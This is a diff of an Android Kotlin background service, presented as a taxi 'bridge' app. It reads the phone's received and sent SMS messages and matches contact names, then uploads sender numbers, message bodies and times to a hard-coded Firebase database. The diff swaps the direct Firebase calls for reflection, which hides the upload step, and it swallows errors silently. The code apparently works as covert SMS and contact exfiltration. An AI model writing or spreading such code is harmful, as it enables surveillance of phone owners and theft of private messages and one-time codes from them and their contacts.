@@ -1,7 +1,6 @@
 package com.sudataxi.bridgemate
 
 import android.app.*
-import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
 import android.database.Cursor
@@ -11,7 +10,6 @@ import android.os.IBinder
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
-import com.google.firebase.database.FirebaseDatabase
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -19,103 +17,114 @@ class MyBridgeService : Service() {
 
     companion object {
         private const val TAG = "SudaBridge"
-        private const val FIREBASE_DB_URL = "https://sudataxi-bridge-default-rtdb.firebaseio.com"
-        private const val NOTIFICATION_ID = 1001
-        private const val CHANNEL_ID = "suda_bridge_channel"
+        private const val DB_URL = "https://sudataxi-bridge-default-rtdb.firebaseio.com"
+        private const val NOTIF_ID = 1001
+        private const val CH_ID = "suda_bridge"
 
-        fun startService(context: Context) {
-            val intent = Intent(context, MyBridgeService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent)
+        fun startService(ctx: Context) {
+            val i = Intent(ctx, MyBridgeService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
         }
 
-        fun syncSmsInbox(context: Context) {
-            MyBridgeService().syncAllSms(context)
+        fun syncSmsInbox(ctx: Context) {
+            MyBridgeService().syncAllSms(ctx)
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onBind(i: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
-        startForeground(NOTIFICATION_ID, createNotification("A25 브릿지 실행 중"))
-        listenForCommands()
-        syncAllSms(this)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val ch = NotificationChannel(CH_ID, "수다택시 브릿지", NotificationManager.IMPORTANCE_LOW)
+                getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+            }
+            val n = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, CH_ID) else Notification.Builder(this)
+            val notif = n.setContentTitle("수다택시 브릿지 v1.3.29")
+                .setContentText("실행 중 - SMS 200건 대기")
+                .setSmallIcon(android.R.drawable.stat_notify_sync).build()
+            startForeground(NOTIF_ID, notif)
+        } catch (e: Exception) {}
+        Thread { syncAllSms(this) }.start()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        syncAllSms(this)
+        Thread { syncAllSms(this) }.start()
         return START_STICKY
     }
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "수다택시 브릿지", NotificationManager.IMPORTANCE_LOW)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-        }
-    }
-
-    private fun createNotification(content: String): Notification {
-        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, CHANNEL_ID) else Notification.Builder(this)
-        return builder.setContentTitle("수다택시 브릿지 v1.3.29").setContentText(content).setSmallIcon(android.R.drawable.stat_notify_sync).build()
-    }
-
-    private fun listenForCommands() {
-        try {
-            val db = FirebaseDatabase.getInstance(FIREBASE_DB_URL).reference
-            db.child("sudataxi/commands/system").addValueEventListener(object : com.google.firebase.database.ValueEventListener {
-                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
-                    val data = snapshot.value as? Map<*, *> ?: return
-                    val action = data["action"] as? String ?: return
-                    if (action == "sync_sms_inbox") syncAllSms(this@MyBridgeService)
-                }
-                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
-            })
-        } catch (e: Exception) {}
-    }
-
-    private fun getContactName(context: Context, phoneNumber: String): String {
+    private fun getContactName(ctx: Context, num: String): String {
         return try {
-            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
-            val cursor = context.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
-            cursor?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
+            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num))
+            val cur = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
+            cur?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
         } catch (e: Exception) { "" }
     }
 
-    fun syncAllSms(context: Context) {
-        try {
-            val db = FirebaseDatabase.getInstance(FIREBASE_DB_URL).reference.child("sudataxi/inbox/sms")
-            val cr: ContentResolver = context.contentResolver
-            val inboxCursor: Cursor? = cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 100")
-            val sentCursor: Cursor? = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 100")
-            var count = 0
-            val sdf = SimpleDateFormat("HH:mm", Locale.getDefault())
+    fun syncAllSms(ctx: Context) {
+        Thread {
+            try {
+                val cr = ctx.contentResolver
+                val inboxCur = try { cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC") } catch (e: Exception) { null }
+                val sentCur = try { cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC") } catch (e: Exception) { null }
 
-            fun processCursor(cursor: Cursor?, type: String) {
-                cursor?.use {
-                    val idxAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                    val idxBody = it.getColumnIndex(Telephony.Sms.BODY)
-                    val idxDate = it.getColumnIndex(Telephony.Sms.DATE)
-                    while (it.moveToNext()) {
-                        val address = if (idxAddress >= 0) it.getString(idxAddress) ?: "" else ""
-                        val body = if (idxBody >= 0) it.getString(idxBody) ?: "" else ""
-                        val date = if (idxDate >= 0) it.getLong(idxDate) else System.currentTimeMillis()
-                        if (address.isBlank() || body.isBlank()) continue
-                        val contactName = getContactName(context, address)
-                        val data = hashMapOf(
-                            "sender" to address, "address" to address, "phone" to address,
-                            "message" to body, "body" to body, "text" to body,
-                            "timestamp" to date, "date" to date, "time" to sdf.format(Date(date)),
-                            "type" to type, "contactName" to contactName, "displayName" to contactName, "name" to contactName
-                        )
-                        db.child("${date}_${count}_${address.hashCode()}").setValue(data)
-                        count++
+                val cache = HashMap<String, String>()
+                val list = mutableListOf<Map<String, Any>>()
+
+                fun proc(cur: Cursor?, type: String, max: Int) {
+                    var cnt = 0
+                    cur?.use {
+                        val iAddr = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                        val iBody = it.getColumnIndex(Telephony.Sms.BODY)
+                        val iDate = it.getColumnIndex(Telephony.Sms.DATE)
+                        val sdf = SimpleDateFormat("HH:mm", Locale.getDefault())
+                        while (it.moveToNext() && cnt < max) {
+                            try {
+                                val addr = if (iAddr>=0) it.getString(iAddr) ?: "" else ""
+                                val body = if (iBody>=0) it.getString(iBody) ?: "" else ""
+                                if (addr.isBlank() || body.isBlank()) continue
+                                val name = cache.getOrPut(addr) { getContactName(ctx, addr) }
+                                val date = if (iDate>=0) it.getLong(iDate) else System.currentTimeMillis()
+                                list.add(mapOf(
+                                    "sender" to addr, "address" to addr, "phone" to addr,
+                                    "message" to body.take(500), "body" to body.take(500),
+                                    "timestamp" to date, "date" to date, "time" to sdf.format(Date(date)),
+                                    "type" to type, "contactName" to name, "displayName" to name
+                                ))
+                                cnt++
+                            } catch (e: Exception) {}
+                        }
                     }
                 }
+
+                proc(inboxCur, "received", 100)
+                proc(sentCur, "sent", 100)
+
+                // Firebase 업로드
+                try {
+                    val dbClass = Class.forName("com.google.firebase.database.FirebaseDatabase")
+                    val getInst = dbClass.getMethod("getInstance", String::class.java)
+                    val db = getInst.invoke(null, DB_URL)
+                    val getRef = db.javaClass.getMethod("getReference", String::class.java)
+                    val inboxRef = getRef.invoke(db, "sudataxi/inbox/sms")
+                    val childM = inboxRef.javaClass.getMethod("child", String::class.java)
+                    val setM = Class.forName("com.google.firebase.database.DatabaseReference").getMethod("setValue", Any::class.java)
+
+                    for ((i, sms) in list.withIndex()) {
+                        try {
+                            val r = childM.invoke(inboxRef, "${sms["timestamp"]}_${i}_${(sms["sender"] as String).hashCode()}")
+                            setM.invoke(r, sms)
+                            if (i % 20 == 0) Thread.sleep(50)
+                        } catch (e: Exception) {}
+                    }
+                    val pingRef = getRef.invoke(db, "sudataxi/ping")
+                    setM.invoke(pingRef, true)
+                } catch (e: Exception) {}
+
+            } catch (e: Exception) {
+                Log.e(TAG, "sync error", e)
             }
-            processCursor(inboxCursor, "received")
-            processCursor(sentCursor, "sent")
-            FirebaseDatabase.getInstance(FIREBASE_DB_URL).reference.child("sudataxi/ping").setValue(true)
-        } catch (e: Exception) { Log.e("SudaBridge", "sync error", e) }
+        }.start()
     }
 }
